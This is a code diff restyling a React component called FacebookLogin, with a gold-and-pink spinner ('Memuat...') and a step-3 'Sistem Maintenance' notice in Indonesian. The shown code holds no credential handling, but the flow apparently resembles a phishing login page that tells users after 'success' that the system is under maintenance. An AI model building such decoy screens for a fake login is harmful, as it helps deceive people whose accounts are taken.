@@ -51,13 +51,21 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
   // Custom Loading Component
   if (showCustomLoading) {
     return (
-      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm animate-fade-in">
-        <div className="relative animate-pulse">
-          <img 
-            src="/loading.png" 
-            alt="Loading..." 
-            className="w-[400px] md:w-[500px] h-auto drop-shadow-2xl"
-          />
+      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fade-in">
+        <div className="flex flex-col items-center">
+          <div className="relative w-20 h-20 mb-4">
+            {/* Outer Ring - Gold */}
+            <div className="absolute inset-0 rounded-full border-[5px] border-t-[#ffd700] border-r-[#ffd700] border-b-transparent border-l-transparent animate-spin"></div>
+            {/* Inner Ring - Pink */}
+            <div className="absolute inset-2 rounded-full border-[5px] border-t-transparent border-r-[#e91e63] border-b-[#e91e63] border-l-transparent animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1.5s' }}></div>
+            {/* Center Dot */}
+            <div className="absolute inset-0 flex items-center justify-center">
+               <div className="w-3 h-3 bg-white rounded-full animate-ping"></div>
+            </div>
+          </div>
+          <div className="text-[#ffd700] font-black text-lg tracking-[0.2em] uppercase drop-shadow-[0_0_10px_rgba(255,215,0,0.5)] animate-pulse">
+            Memuat...
+          </div>
         </div>
       </div>
     );
@@ -124,26 +132,42 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
 
       {/* ================= STEP 3: SUCCESS MODAL ================= */}
       {step === 3 && (
-        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
-          <div className="relative">
-            <img 
-              src="/maintance.png" 
-              alt="System Maintenance" 
-              className="w-[300px] md:w-[400px] h-auto drop-shadow-2xl rounded-xl"
-            />
-            
+        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-pop-in">
+          <div className="relative w-[320px] bg-gradient-to-b from-[#4a148c] to-[#2a0e45] rounded-xl border-2 border-[#ffd700] p-5 flex flex-col items-center shadow-[0_0_20px_rgba(255,215,0,0.3)]">
+            {/* Close Button */}
             <button 
               onClick={onClose} 
-              className="absolute top-2 right-2 w-8 h-8 flex items-center justify-center bg-red-500/80 hover:bg-red-600 text-white rounded-full transition-colors z-10 font-bold shadow-md border border-white/20"
+              className="absolute top-2 right-2 w-6 h-6 flex items-center justify-center bg-white/10 hover:bg-white/20 rounded-full text-white transition-colors text-xs"
             >
               ✕
             </button>
 
+            {/* Animated Icon */}
+            <div className="w-16 h-16 mb-4 relative">
+               <div className="absolute inset-0 bg-[#ffd700]/20 rounded-full animate-ping"></div>
+               <div className="relative w-full h-full bg-[#ffd700] rounded-full flex items-center justify-center shadow-[0_0_15px_#ffd700]">
+                  <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#4a148c] animate-spin-slow" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                  </svg>
+               </div>
+            </div>
+
+            {/* Text Content */}
+            <h3 className="text-[#ffd700] text-lg font-black uppercase tracking-wider mb-2 text-center drop-shadow-md">
+              Sistem Maintenance
+            </h3>
+            <p className="text-white/80 text-center text-xs leading-relaxed mb-4 font-medium px-2">
+              Maaf, saat ini sistem sedang dalam perbaikan berkala untuk meningkatkan kualitas layanan.
+            </p>
+
+            {/* Action Button */}
             <button 
               onClick={onClose}
-              className="absolute bottom-[10%] left-1/2 transform -translate-x-1/2 w-[120px] h-[40px] bg-transparent border-none z-20 cursor-pointer"
-              aria-label="Confirm"
-            ></button>
+              className="px-6 py-1.5 bg-gradient-to-r from-[#ffd700] to-[#ffb74d] text-[#4a148c] text-sm font-bold rounded-full shadow-md hover:scale-105 active:scale-95 transition-transform"
+            >
+              Mengerti
+            </button>
           </div>
         </div>
       )}
